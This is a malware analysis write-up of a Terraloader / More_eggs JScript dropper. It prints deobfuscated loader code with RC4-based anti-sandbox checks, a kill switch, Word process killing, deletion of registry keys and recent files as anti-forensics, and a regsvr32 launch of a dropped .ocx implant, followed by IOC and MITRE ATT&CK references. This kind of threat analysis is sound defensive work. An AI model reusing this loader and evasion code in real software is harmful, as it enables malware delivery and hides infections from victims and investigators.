## Easter's time : Hunting for get more_eggs
## Table of Contents
* [Malware analysis](#Malware-analysis)
* [Cyber kill chain](#Cyber-kill-chain)
* [Indicators Of Compromise (IOC)](#IOC)
* [References MITRE ATT&CK Matrix](#Ref-MITRE-ATTACK)
* [Links](#Links)
  + [Original Tweet](#tweet)
  + [Link Anyrun](#Links-Anyrun)
  + [Articles](#Articles)

<h2>Malware analysis <a name="Malware-analysis"></a></h2>

###### The present analysis focus on the modifications with the last analysis of Terraloader (Cf Links)

###### The first layer rest the same just the parameters and the structure of the switch of the anti-sandbox method are differents.

```js
 var seq = [53,52,53,49,48,56,51,55,66,56,68,51,65,51,66,53,50,67,50,70,49,54,56,55,49,56,67,67,66,66,68,67,52,67,50,56,48,67,50,56,70,51,52,53,66,53,53,65,54,56,67,70,51];
  var base_rc4_array = [0,152,60,221,140,160,139,240,36,106,223,225,185,196,254,43,113,54,238,79,235,22,152,106,193,78,229,233,238,184,185,67,137,71,157,14,35,183,15,105,84,184,176,219,21,228,205,195,167,232,9,170,6];
  var jump = 0;
  var l = "";
  var lim = 0;
  var t1 = [];
  var tabex = [120,98,74,83,111,102,97,82,110,121,84,105,69,76] ;
  var index = 14;
  var i = 0;
  var checksum;
  // do while 
   do {
    l = (i + "");
    c = l.length;
    if (c === 1) {tabex[index] = filter(i);} 
    else {
    t1 = split_tab(l);
    tabex[index] = filter(t1[0]);
    switch (lim) {
      case 2:
        tabex[index + 1] = filter(t1[1]);
        break;
      case 3:
        tabex[index + 1] = filter(t1[1]);
        tabex[index + 2] = filter(t1[2]);
        break;
      case 4:
        tabex[index + 1] = filter(t1[1]);
        tabex[index + 2] = filter(t1[2]);
        tabex[index + 3] = filter(t1[3]);
        break;
      case 5:
        tabex[index + 1] = filter(t1[1]);
        tabex[index + 2] = filter(t1[2]);
        tabex[index + 3] = filter(t1[3]);
        tabex[index + 4] = filter(t1[4]);
        break;
    }
    }
  checksum = rc4_gen_xor(base_rc4_array, tabex, lim + index);
    if (check(checksum, seq) === true) {jump = 670;} // if the sequence is correct -> jump
    i = i + 1;
  } while (jump === 0);
  seq = 0;
  base_rc4_array = 0;
  i = 0;
  offset_tab = lim + index;
  if (jump === 670) { // execute payload
```

###### By debugging, we can get the parameters used for decrypt the obfuscated data.

<center>
<table>
<tr>
<td><center>Variable</center></td>
<td><center>Value</center></td>
</tr>
<tr>
<td><center>tabex</center></td>
<td>120,98,74,83,111,102,97,82,110,121,84,105,69,76,53,57,55</td>
</tr>
<tr>
<td><center>index</center></td>
<td><center>14</center></td>
</tr>
<tr>
<td><center>lim</center></td>
<td><center>3</center></td>
</tr>
<tr>
<td><center>i</center></td>
<td><center>598</center></td>
</tr>
<tr>
<td><center>offset_tab</center></td>
<td><center>17</center></td>
</tr>
</table>
</center>

###### The main differences with the last analysis are on the main function, we can already observe that use this time non-instantiated variables instead of variables used on the first layer on the previous analysis.

```js
 // Variables used as breakpoint
    ygahzfm0731 = "reg delete ";
    ygahzfm64 = "HKCU\\Software\\Microsoft\\Office\\";
    ygahzfm354 = ".0\\Word\\";
    ygahzfm6906 = "Resiliency /f";
    ygahzfm619 = "File MRU\\Item 1";

// Push breakpoint after used
    ygahzfm64 = 0;
    ygahzfm354 = 0;
    ygahzfm6906 = 0;
    ygahzfm619 = 0;
    ygahzfm0731 = 0;

try 
{
    if (ygahzfm555 && ygahzfm81 && ygahzfm3282 && ygahzfm4066 && ygahzfm0731 && ygahzfm64 && ygahzfm354 && ygahzfm6906 && ygahzfm619 && ygahzfm28 && ygahzfm822){main();}
}
catch (e){var ygahzfm03 = 0;}

```
###### The second operation anti-sandbox rest the same (sandbox don't properly handle exceptions.) 

```js
function main() 
{
    try 
    {
        ygahzfm2351.ygahzfm5433; // Kill switch
        return true;
    }  
    catch(e) {exec_pay();}
}
```

###### We can see on the first bloc of the function, the preparation settings for the rest of the operation and send a kill signal to an eventual running word instance which avoids to perform the operations on the next block.

```js
function exec_pay()
{
    var ActXobj1;
    var ActXobj2;
    var path_appdata = "";
    var arg = "";
    try 
    {
        ActXobj1 = get_actxobj("WScript.Shell");
        ActXobj2 = ActXobj1.environment("PROCESS");
        path_appdata = ActXobj2(path_appdata + "\\Microsoft\\");
    } catch (e) {path_appdata = "";}
    var excepvalue;
    try 
    {
        var wmiObj1 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2");
        var StartInfos1 = wmiObj1.Get("Win32_ProcessStartup").SpawnInstance_();
        StartInfos1.ShowWindow = 0;
        var Id;
        var process1 = wmiObj1.Get("Win32_Process");
        var Inst1 = process1.Methods_("Create").inParameters.SpawnInstance_();
        Inst1.Properties_.Item("CommandLine").Value = "taskkill /F /IM winword.exe"
        Inst1.Properties_.Item("ProcessStartupInformation").Value = StartInfos1;
        var process2 = wmiObj1.ExecMethod("Win32_Process","Create");
        if (process2.ReturnValue !== 0) {ygahzfm8153;}
        Id = process2.ProcessId;
        var Notif = wmiObj1.ExecNotificationQuery("Select * From __InstanceDeletionEvent Within 1 Where TargetInstance ISA 'Win32_Process'");
        var event;
        while (true) 
        {
            event = Notif.nextEvent();
            if (event.TargetInstance.ProcessID == Id){break;}
        }
    } 
    catch (e) 
    {
        try {ActXobj1.Run("taskkill /F /IM winword.exe", 0, 1);} 
        catch (e) {excepvalue = 691;}
    }
    
    ygahzfm28 = 0;
    var OfficeVersion = 11;
    var key;
    var datakey;
    var Namekey;
    // Variables used as breakpoint
    ygahzfm0731 = "reg delete ";
    ygahzfm64 = "HKCU\\Software\\Microsoft\\Office\\";
    ygahzfm354 = ".0\\Word\\";
    ygahzfm6906 = "Resiliency /f";
    ygahzfm619 = "File MRU\\Item 1";
```
###### The second performs a loop for getting the path of the last element open with word software and delete resiliency keys as anti-forensic. Once done, this uses the last element if the list of the recent files isn't empty in deleting the last element too or write and show an empty page (doc file). The attacker doesn't check the number of executions and deletes uniquely the last element if recent files have been opened or show empty file generated.

```js
    while (OfficeVersion <= 16) 
    {
        if (OfficeVersion !== 13) 
        {
            try 
            {
                key = ActXobj1.RegRead("HKCU\\Software\\Microsoft\\Office\\" + OfficeVersion + ".0\\Word\\File MRU\\Item 1"); // key last element open in word
                if (key) 
                {
                    try 
                    {
                        var wmiObj2 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2");
                        var StartInfos2 = wmiObj2.Get("Win32_ProcessStartup").SpawnInstance_();
                        StartInfos2.ShowWindow = 0;
                        var process2 = wmiObj2.Get("Win32_Process").Create("reg delete HKCU\\Software\\Microsoft\\Office\\" + OfficeVersion + ".0\\Word\\Resiliency /f", null, StartInfos2, 0);
                        if (process2 !== 0) {ygahzfm6217;}
                    }
                    catch (e) 
                    {
                        try {ActXobj1.Run("reg delete HKCU\\Software\\Microsoft\\Office\\" + OfficeVersion + ".0\\Word\\Resiliency /f", 0, 1); } 
                        catch (e) {excepvalue = 953;}
                    }
                    datakey = key.split("*");
                    if (get_length(datakey) === 2) 
                    {
                        PathLastElement = datakey[1];
                        OfficeVersion = 23; // Stop loop 
                    }
                }
            }
            catch (e) {excepvalue = 168;}
        }
        OfficeVersion = OfficeVersion + 1;
        }
    OfficeVersion = 0;
    key = 0;
    datakey = 0;
    // Push breakpoint
    ygahzfm64 = 0;
    ygahzfm354 = 0;
    ygahzfm6906 = 0;
    ygahzfm619 = 0;
    ygahzfm0731 =0;
    if (PathLastElement) 
        {
            try 
            {
                var ScriptingObj1 = get_actxobj("Scripting.FileSystemObject");
                if (ScriptingObj1.FileExists(PathLastElement)) {ScriptingObj1.DeleteFile(PathLastElement);}
            }
            catch(e) {excepvalue = 421;}
            ygahzfm822 = 0;
            ScriptingObj1 = 0;
        } 
    else {PathLastElement = path_appdata + get_random_num() + ".doc";}
    if (write_obj(ygahzfm3282, PathLastElement, ygahzfm555, ygahzfm81, 0) === 1)
    {

        var PathDoc = '"' + PathLastElement + '"';
        var ControlValue = 0;
        try 
        {
            var wmiObj3 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2");
            var StartInfos3 = wmiObj3.Get("Win32_ProcessStartup").SpawnInstance_();
            StartInfos3.ShowWindow = 0;
            var OpenWord = wmiObj3.Get("Win32_Process").Create('cmd /c start "" winword.exe ' + PathDoc, null, StartInfos3, 0);
            if (OpenWord !== 0){ygahzfm564;}
        } 
        catch(e) 
        {
            try
            {
                ActXobj1.Run(PathDoc, 1, 0);
                ControlValue = 1;
            } 
            catch (e) {ControlValue = 0;}
        }
        PathDoc = 0;
    }
    ygahzfm3282 = 0;
    PathLastElement = 0;
  ```

###### The final block is common with the last analysis and executes the implant (ocx file).

  ```js
  path_appdata = path_appdata + get_random_num() + ".ocx";
    if (write_obj(ygahzfm3173, path_appdata, ygahzfm555, ygahzfm81, 1) === 1)
    {
        ygahzfm3173 = "";
        var ControlValue2 = 0;
        arg = 'regsvr32 /s /n /i "' + path_appdata + '"';
        try 
        {
            var wmiObj4 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2");
            var retValue = wmiObj4.Get("Win32_Process").Create(arg, null, null, 0);
            if (retValue !== 0) {ygahzfm115;}
        } 
        catch (e) 
        {
            try
            {
                ActXobj1.Run(arg, 1, 0);
                ControlValue2 = 1;
            } 
            catch (e) {ControlValue2 = 0;}
        }
    }
}
```

###### We can resume the differences between the both versions :

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/Terraloader/2020-04-12/Pictures/Resume.png"></img></center>


###### Like the last analysis, the coding level isn't unique and some parts of the code seems be copied from another work due to differents ways to designing the algorithms and logic of code execution are not the same.

###### We can also observe that the structure used in the payloads are the same, we can note that the group only add anti-forensic and slightly modify the algorithms as new features (with some wrong logic of implementation) :

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/Terraloader/2020-04-12/Pictures/layer1.png"></img></center>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/Terraloader/2020-04-12/Pictures/layer2.png"></img></center>

<h6>In seeing the way of like organised the code, we can thinking the technics used for created the sample : </h6>

###### For the random values, we have a switch with a random value for select one of type arithmetic operation for the numbers used for decrypt and anti-sandbox :

```js
50 //number to obfuscate
50*2*8  = 800 //multiply by n even number
800 - 50 = 750 // getting new base 
//depends on the operation choosen
750/50 = 15 -> [750/15] = 50 //obfucated
-> [-750 + 800 ] //obfucated

```

###### So we can note differents marks must be on the both templates ( layer 1 & 2 ) :

<ul>
<li>Numbers for algorithms</li>
<li>Sensitives strings</li>
<li>Unique name of variable</li>
<li>On a common familly names of variable</li>
<li>Obfuscated payloads</li>
</ul>

###### For the name of the string, a common base is created for all variables, just an identification of the variable. This content at least 5-7 letters as base and a random value.

###### We can resume like the following schema :

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/Terraloader/2020-04-12/Pictures/tool.png"></img></center>
 
<h2> Cyber kill chain <a name="Cyber-kill-chain"></a></h2>
<h6>This process graph represent the cyber kill chain used by the attacker.</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/Terraloader/2020-04-12/Pictures/killchain.png">
</p>
<h2> Indicators Of Compromise (IOC) <a name="IOC"></a></h2>
<h6> The IOC can be exported in <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Terraloader/2020-04-12/JSON/IOC_Terraloader_2020-04_12.json">JSON</a> and <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Terraloader/2020-04-12/CSV/IOC_Terraloader_2020-04_12.csv">CSV</a></h6>

<h2> References MITRE ATT&CK Matrix <a name="Ref-MITRE-ATTACK"></a></h2>

|Enterprise tactics|Technics used|Ref URL|
| :---------------: |:-------------| :------------- |
|Execution|Windows Management Instrumentation<br>Command-Line Interface<br>Execution through Module Load|https://attack.mitre.org/techniques/T1047/<br>https://attack.mitre.org/techniques/T1059/<br>https://attack.mitre.org/techniques/T1129/|
|Persistence|Registry Run Keys / Startup Folder|https://attack.mitre.org/techniques/T1060/|
|Defense Evasion|Install Root Certificate|https://attack.mitre.org/techniques/T1130/|
|Discovery|Query Registry|https://attack.mitre.org/techniques/T1012/
|Discovery|Query Registry|https://attack.mitre.org/techniques/T1012/|

<h6> This can be exported as JSON format <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Terraloader/2020-04-12/JSON/Mitre-Terraloader_2020_04-12.json">Export in JSON</a></h6>

<h2>Links <a name="Links"></a></h2>
<h6> Original tweet: </h6><a name="tweet"></a>

* [https://twitter.com/malz_intel/status/1248383197533986818](https://twitter.com/malz_intel/status/1248383197533986818) 

<h6> Links Anyrun: <a name="Links-Anyrun"></a></h6>

* [https://app.any.run/tasks/3e79065e-487d-45ff-999e-e125107e4bbb](dd61541351f8040c26cb1efdaef15fdb041498db7b2982ed5af47a07dea12151.sct)

<h6>Articles <a name="Articles"></a></h6>

 + [Analysis of the Terraloader sample (2019)](https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Terraloader/02-01-20/Analysis.md)
